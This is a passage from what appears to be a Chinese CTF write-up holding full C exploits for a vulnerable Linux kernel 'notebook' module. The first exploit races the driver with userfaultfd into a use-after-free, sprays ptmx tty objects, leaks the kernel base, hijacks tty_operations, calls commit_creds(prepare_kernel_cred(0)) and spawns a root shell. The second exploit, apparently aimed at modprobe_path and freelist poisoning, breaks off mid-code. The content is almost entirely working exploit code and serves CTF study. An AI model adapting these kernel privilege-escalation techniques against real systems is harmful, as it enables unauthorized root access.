class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. notebook[0].note = heap1 / notebook[0].size = 0x3a8</span></span><br><span class="line">    <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="string">&#x27;a&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteedit(<span class="number">0</span>,<span class="number">0x3a8</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x500</span></span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x60</span></span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);   <span class="comment">//ç»™1sç¼“å†²æ—¶é—´ï¼Œè®©sizeå€¼å†™ä¸Š</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 4. get heap1 back, then we can use the UAF</span></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ;i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;dev/ptmx&quot;</span>,<span class="number">2</span>);              <span class="comment">// in kernel it will kmalloc(0x3a8)</span></span><br><span class="line">        read_note(ret_buf, <span class="number">0</span>);                          </span><br><span class="line">        leak_addr = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x18</span>);</span><br><span class="line">        <span class="keyword">if</span>(((leak_addr&amp;<span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) == <span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((leak_addr&amp;<span class="number">0xfff</span>) == <span class="number">0x440</span>)              <span class="comment">// check whether we hit heap1 or not</span></span><br><span class="line">            &#123;</span><br><span class="line">                index = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found it! the index is %d\n&quot;</span>,index);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get heap1 back, let&#x27;s reboot and try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. calc kernel base</span></span><br><span class="line">    kernel_base = leak_addr - (ptm_ops - bzImage_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. notebook[0].note = heap2 / notebook[0].size = 0x100</span></span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteedit(<span class="number">1</span>,<span class="number">0x100</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. change tty_operations-&gt;ioctl to work_for_cpu_fn</span></span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr_fn = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span>* fop_buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// å…ˆè¯»åå†™</span></span><br><span class="line">    read_note(fop_buf,<span class="number">1</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fop_buf+<span class="number">0x60</span>) = work_for_cpu_fn - bzImage_base + kernel_base; </span><br><span class="line">    write_note(fop_buf,<span class="number">1</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tty_struct heap1 addr: 0x%lx\n&quot;</span>,*(<span class="keyword">int64_t</span> *)(ret_buf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tty_operations heap2 addr: 0x%lx\n&quot;</span>,heap_addr_fn);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. prepare_kernel_creds(0)    </span></span><br><span class="line">    <span class="comment">// å…ˆè¯»åå†™ï¼Œä¸ç„¶å¯èƒ½è¦†ç›–æ‰é‡è¦æ•°æ®</span></span><br><span class="line">    <span class="keyword">char</span>* tty_buf = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    read_note(tty_buf,<span class="number">0</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x18</span>) = heap_addr_fn;         <span class="comment">// change tty_struct-&gt;ops, make it points to heap2</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x20</span>) = pkc_addr - bzImage_base + kernel_base;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x28</span>) = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> old_value_0x30 = *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;old value : 0x%lx\n&quot;</span>,old_value_0x30);</span><br><span class="line">    write_note(tty_buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd[index],<span class="number">0x100</span>,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. commit_cred(prepare_kernel_creds(0))    </span></span><br><span class="line">    <span class="comment">// å…ˆè¯»åå†™ï¼Œä¸ç„¶å¯èƒ½è¦†ç›–æ‰é‡è¦æ•°æ®</span></span><br><span class="line">    read_note(tty_buf,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> pkc_ret = *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x30</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x18</span>) = heap_addr_fn;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x20</span>) = cc_addr - bzImage_base + kernel_base;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x28</span>) = pkc_ret;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(tty_buf+<span class="number">0x30</span>) = old_value_0x30;</span><br><span class="line">    write_note(tty_buf,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd[index],<span class="number">0x100</span>,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. get root shell</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() = %d\n&quot;</span>,getuid());</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Pwned!\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp5"   >
          <a href="#exp5" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp5" class="headerlink" title="exp5"></a>exp5</h3>
      <p>å†…æ ¸åœ°å€æ³„éœ²ï¼šåˆ©ç”¨koæ³„éœ²ï¼ˆç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œe8æŒ‡ä»¤åå››ä¸ªå­—èŠ‚æ˜¯ç›¸å¯¹åç§»é‡ï¼Œè¢«è°ƒç”¨å‡½æ•°å®é™…æ®µåç§»é‡ = ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ + ç›¸å¯¹åç§»é‡ï¼‰<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/55726f7e355a" >å¸¦ä½ å¼„æ‡‚ call æŒ‡ä»¤è°ƒç”¨æ–¹å¼</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä»»æ„åœ°å€è¯»å†™ï¼šæ³„éœ²å †åœ°cookieï¼Œæ„é€ heapé“¾ï¼š<code>freelist -&gt; chunk1 -&gt; notebook_addr - 0x10</code>ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"><span class="keyword">int</span> uaf_index;</span><br><span class="line"><span class="keyword">uint64_t</span> module_base = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_addr = <span class="number">0xFFFFFFFF8225D2E1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x100</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_mod_base</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *stream =popen(<span class="string">&quot;cat /tmp/moduleaddr  | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    fread(mem,<span class="number">0x12</span>,<span class="number">1</span>,stream);</span><br><span class="line">    module_base = strtoul(mem,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Mod_BASE:\t %lX\n&quot;</span>,module_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span 